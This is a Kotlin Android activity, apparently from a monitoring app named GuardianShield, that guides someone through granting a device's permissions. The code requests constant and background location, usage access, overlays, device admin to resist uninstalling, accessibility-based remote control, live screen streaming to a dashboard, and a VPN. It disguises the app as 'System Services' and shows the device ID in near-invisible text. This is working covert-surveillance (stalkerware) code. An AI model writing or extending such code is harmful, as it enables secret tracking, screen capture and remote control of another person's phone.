package com.guardianshield.app

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.net.VpnService
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.widget.*
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.guardianshield.app.receivers.DeviceAdminReceiver
import com.guardianshield.app.services.MainService
import com.guardianshield.app.services.SiteBlockerVpn

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "SysServices"
        private const val PREFS = "gs_main"
        private const val KEY_SCREEN_GRANTED = "screen_granted"
    }

    // ── UI refs ───────────────────────────────────────────────────────────────
    private lateinit var tvStepTitle: TextView
    private lateinit var tvStepDesc: TextView
    private lateinit var tvStepHint: TextView
    private lateinit var btnAction: Button
    private lateinit var btnSkip: Button
    private lateinit var progressBar: ProgressBar
    private lateinit var tvProgress: TextView
    private lateinit var stepsContainer: LinearLayout

    // Screen capture result
    private var mediaProjectionResultCode: Int = Activity.RESULT_CANCELED
    private var mediaProjectionData: Intent? = null

    // Launchers
    private lateinit var locationLauncher: ActivityResultLauncher<Array<String>>
    private lateinit var bgLocationLauncher: ActivityResultLauncher<String>
    private lateinit var mediaProjectionLauncher: ActivityResultLauncher<Intent>
    private lateinit var vpnLauncher: ActivityResultLauncher<Intent>
    private lateinit var deviceAdminLauncher: ActivityResultLauncher<Intent>

    // ── Steps (screen recording handled separately at end) ────────────────────
    private data class Step(
        val id: String,
        val title: String,
        val description: String,
        val hint: String,
        val actionLabel: String,
        val skippable: Boolean = false
    )

    private val steps = listOf(
        Step("location",      "Location Access",
            "Allows tracking the device location in real time.",
            "Tap Grant → then tap \"Allow all the time\".",
            "Grant Location"),
        Step("bg_location",   "Background Location",
            "Keeps tracking location even when the app is closed.",
            "Select \"Allow all the time\".",
            "Grant Background Location"),
        Step("usage_stats",   "App Usage Access",
            "Required to detect and block apps.",
            "Find \"System Services\" in the list → tap it → turn on the toggle.",
            "Open Settings"),
        Step("overlay",       "Display Over Apps",
            "Shows a block screen when a restricted app is opened.",
            "Find \"System Services\" → tap it → turn on \"Allow display over other apps\".",
            "Open Settings"),
        Step("device_admin",  "Device Admin",
            "Prevents the app from being uninstalled easily.",
            "Tap \"Activate this device admin app\".",
            "Activate", skippable = true),
        Step("battery",       "Battery Optimization",
            "Keeps the service running in the background 24/7.",
            "Tap \"Allow\".",
            "Disable Battery Limits"),
        Step("accessibility", "Accessibility Service",
            "Required for remote control — taps, swipes, navigation buttons.",
            "Find \"System Services\" → tap it → turn on the toggle → tap OK/Allow.",
            "Open Accessibility"),
        Step("screen",        "Screen Recording",
            "Streams the screen live to your dashboard.",
            "Tap \"Start now\" to allow screen capture.",
            "Allow Screen Record"),
        Step("vpn",           "VPN / Site Blocker",
            "Blocks inappropriate websites on all browsers.",
            "Tap \"OK\" to allow the VPN connection.",
            "Allow VPN")
    )

    private var currentStepIndex = 0
    private var waitingForSettingsReturn = false

    // ── Lifecycle ──────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Config.init(this)
        registerLaunchers()
        buildUI()

        if (isFullySetup()) {
            showActiveStatus()
        } else {
            advanceToNextPendingStep()
        }
    }

    override fun onResume() {
        super.onResume()
        if (!waitingForSettingsReturn) return
        waitingForSettingsReturn = false

        // Re-check whichever step we were on
        if (currentStepIndex < steps.size && isStepDone(currentStepIndex)) {
            markCurrentDone()
        } else {
            // Show retry hint
            retryStep()
        }
    }

    // ── Launchers ──────────────────────────────────────────────────────────────
    private fun registerLaunchers() {
        locationLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { results ->
            if (results.values.all { it }) markCurrentDone() else retryStep()
        }

        bgLocationLauncher = registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { granted ->
            if (granted) markCurrentDone() else retryStep()
        }

        mediaProjectionLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                mediaProjectionResultCode = result.resultCode
                mediaProjectionData = result.data
                getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .edit().putBoolean(KEY_SCREEN_GRANTED, true).apply()
                markCurrentDone()
            } else {
                retryStep()
            }
        }

        vpnLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            if (result.resultCode == Activity.RESULT_OK) markCurrentDone() else retryStep()
        }

        deviceAdminLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { _ ->
            if (isDeviceAdminActive()) markCurrentDone() else retryStep()
        }
    }

    // ── UI ─────────────────────────────────────────────────────────────────────
    private fun buildUI() {
        val root = ScrollView(this).apply {
            setBackgroundColor(Color.parseColor("#0F172A"))
        }
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(56, 64, 56, 48)
        }

        // App label — neutral
        container.addView(TextView(this).apply {
            text = "System Services"
            textSize = 20f
            setTextColor(Color.parseColor("#475569"))
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, 4)
        })

        tvProgress = TextView(this).apply {
            text = "Step 1 of ${steps.size}"
            textSize = 13f
            setTextColor(Color.parseColor("#64748B"))
            setPadding(0, 0, 0, 8)
        }
        container.addView(tvProgress)

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = steps.size
            progress = 1
            progressTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#4F8CFF"))
            progressBackgroundTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#1E293B"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 16
            ).apply { bottomMargin = 40 }
        }
        container.addView(progressBar)

        // Card
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#1E293B"))
            setPadding(48, 48, 48, 48)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = 24 }
        }

        tvStepTitle = TextView(this).apply {
            textSize = 21f
            setTextColor(Color.WHITE)
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, 12)
        }
        card.addView(tvStepTitle)

        tvStepDesc = TextView(this).apply {
            textSize = 14f
            setTextColor(Color.parseColor("#CBD5E1"))
            setPadding(0, 0, 0, 20)
        }
        card.addView(tvStepDesc)

        val hintBox = LinearLayout(this).apply {
            setBackgroundColor(Color.parseColor("#0F2A4A"))
            setPadding(28, 20, 28, 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = 28 }
        }
        tvStepHint = TextView(this).apply {
            textSize = 13f
            setTextColor(Color.parseColor("#93C5FD"))
        }
        hintBox.addView(tvStepHint)
        card.addView(hintBox)

        btnAction = Button(this).apply {
            textSize = 15f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#4F8CFF"))
            typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 140
            ).apply { bottomMargin = 12 }
            setOnClickListener { performStepAction() }
        }
        card.addView(btnAction)

        btnSkip = Button(this).apply {
            text = "Skip this step"
            textSize = 13f
            setTextColor(Color.parseColor("#64748B"))
            setBackgroundColor(Color.TRANSPARENT)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 100
            )
            setOnClickListener { markCurrentDone(skipped = true) }
        }
        card.addView(btnSkip)

        container.addView(card)

        container.addView(TextView(this).apply {
            text = "Progress:"
            textSize = 13f
            setTextColor(Color.parseColor("#475569"))
            setPadding(0, 4, 0, 8)
        })

        stepsContainer = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        container.addView(stepsContainer)

        root.addView(container)
        setContentView(root)
        buildChecklist()
    }

    private fun buildChecklist() {
        stepsContainer.removeAllViews()
        steps.forEachIndexed { idx, step ->
            stepsContainer.addView(TextView(this).apply {
                textSize = 13f
                setPadding(0, 5, 0, 5)
                val done = isStepDone(idx)
                text = when {
                    done              -> "✅  ${step.title}"
                    idx == currentStepIndex -> "▶   ${step.title}"
                    else              -> "○   ${step.title}"
                }
                setTextColor(when {
                    done              -> Color.parseColor("#22C55E")
                    idx == currentStepIndex -> Color.WHITE
                    else              -> Color.parseColor("#475569")
                })
            })
        }
    }

    private fun showStep(index: Int) {
        if (index >= steps.size) { finishSetup(); return }
        val step = steps[index]
        tvStepTitle.text = step.title
        tvStepDesc.text = step.description
        tvStepHint.text = "What to do:  ${step.hint}"
        tvStepHint.setTextColor(Color.parseColor("#93C5FD"))
        btnAction.text = step.actionLabel
        btnAction.setBackgroundColor(Color.parseColor("#4F8CFF"))
        btnSkip.visibility = if (step.skippable) android.view.View.VISIBLE else android.view.View.GONE
        tvProgress.text = "Step ${index + 1} of ${steps.size}"
        progressBar.progress = index + 1
        buildChecklist()
    }

    // ── Step flow ──────────────────────────────────────────────────────────────
    private fun advanceToNextPendingStep() {
        while (currentStepIndex < steps.size && isStepDone(currentStepIndex)) {
            currentStepIndex++
        }
        if (currentStepIndex >= steps.size) finishSetup()
        else showStep(currentStepIndex)
    }

    private fun markCurrentDone(skipped: Boolean = false) {
        Log.i(TAG, "Step done: ${steps.getOrNull(currentStepIndex)?.id} skip=$skipped")
        currentStepIndex++
        advanceToNextPendingStep()
    }

    private fun retryStep() {
        if (currentStepIndex >= steps.size) return
        val step = steps[currentStepIndex]
        tvStepHint.text = "Not detected yet — make sure you enabled it, then tap the button again.\n\n What to do:  ${step.hint}"
        tvStepHint.setTextColor(Color.parseColor("#FCA5A5"))
        btnAction.text = "I did it — try again"
        btnAction.setBackgroundColor(Color.parseColor("#DC2626"))
    }

    private fun performStepAction() {
        if (currentStepIndex >= steps.size) return
        when (steps[currentStepIndex].id) {

            "location" -> locationLauncher.launch(arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ))

            "bg_location" -> bgLocationLauncher.launch(
                Manifest.permission.ACCESS_BACKGROUND_LOCATION
            )

            "usage_stats" -> {
                waitingForSettingsReturn = true
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                showGoAndReturn()
            }

            "overlay" -> {
                waitingForSettingsReturn = true
                startActivity(Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                ))
                showGoAndReturn()
            }

            "device_admin" -> {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        ComponentName(this@MainActivity, DeviceAdminReceiver::class.java))
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for device protection.")
                }
                deviceAdminLauncher.launch(intent)
            }

            "battery" -> {
                waitingForSettingsReturn = true
                startActivity(Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                ))
                showGoAndReturn()
            }

            "accessibility" -> {
                waitingForSettingsReturn = true
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                showGoAndReturn()
            }

            "screen" -> {
                val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                mediaProjectionLauncher.launch(mgr.createScreenCaptureIntent())
            }

            "vpn" -> {
                val vpnIntent = VpnService.prepare(this)
                if (vpnIntent != null) vpnLauncher.launch(vpnIntent)
                else markCurrentDone()
            }
        }
    }

    private fun showGoAndReturn() {
        btnAction.text = "I enabled it — continue ✓"
        btnAction.setBackgroundColor(Color.parseColor("#16A34A"))
    }

    // ── Permission checks ──────────────────────────────────────────────────────
    private fun isStepDone(idx: Int): Boolean {
        if (idx >= steps.size) return true
        return when (steps[idx].id) {
            "location"      -> hasLocationPermission()
            "bg_location"   -> hasBgLocationPermission()
            "usage_stats"   -> hasUsageStatsPermission()
            "overlay"       -> Settings.canDrawOverlays(this)
            "device_admin"  -> isDeviceAdminActive()
            "battery"       -> {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                pm.isIgnoringBatteryOptimizations(packageName)
            }
            "accessibility" -> isAccessibilityServiceEnabled()
            // Screen: accept if we got data this session OR a previous session stored the flag
            "screen"        -> mediaProjectionData != null ||
                getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .getBoolean(KEY_SCREEN_GRANTED, false)
            "vpn"           -> VpnService.prepare(this) == null
            else            -> false
        }
    }

    private fun hasLocationPermission() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasBgLocationPermission() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        return appOps.unsafeCheckOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), packageName
        ) == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
    }

    /**
     * Robust check — Android stores the service name in different formats:
     *   com.package/.services.ServiceName   (short)
     *   com.package/com.package.services.ServiceName  (full)
     * We just look for our package + the class name.
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.split(":").any { component ->
            component.contains(packageName, ignoreCase = true) &&
            component.contains("RemoteControlService", ignoreCase = true)
        }
    }

    private fun isFullySetup(): Boolean =
        hasLocationPermission() &&
        hasUsageStatsPermission() &&
        Settings.canDrawOverlays(this) &&
        isAccessibilityServiceEnabled()

    // ── Finish ─────────────────────────────────────────────────────────────────
    private fun finishSetup() {
        Log.i(TAG, "All steps done — starting services")

        // If we have fresh media projection data, pass it to the service
        val serviceIntent = Intent(this, MainService::class.java).apply {
            if (mediaProjectionData != null) {
                putExtra("resultCode", mediaProjectionResultCode)
                putExtra("data", mediaProjectionData)
            }
        }
        startForegroundService(serviceIntent)
        startService(Intent(this, SiteBlockerVpn::class.java))
        showActiveStatus()
    }

    private fun showActiveStatus() {
        val serviceIntent = Intent(this, MainService::class.java).apply {
            if (mediaProjectionData != null) {
                putExtra("resultCode", mediaProjectionResultCode)
                putExtra("data", mediaProjectionData)
            }
        }
        startForegroundService(serviceIntent)
        startService(Intent(this, SiteBlockerVpn::class.java))

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#0F172A"))
            setPadding(56, 0, 56, 0)
        }
        root.addView(TextView(this).apply {
            text = "✅"
            textSize = 64f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        })
        root.addView(TextView(this).apply {
            text = "Service is active"
            textSize = 24f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 8)
        })
        root.addView(TextView(this).apply {
            text = "Running in the background.\nYou can close this app."
            textSize = 14f
            setTextColor(Color.parseColor("#94A3B8"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        })
        root.addView(TextView(this).apply {
            text = "ID: ${Config.deviceId}"
            textSize = 11f
            setTextColor(Color.parseColor("#1E293B"))
            gravity = Gravity.CENTER
        })
        setContentView(root)
    }
}
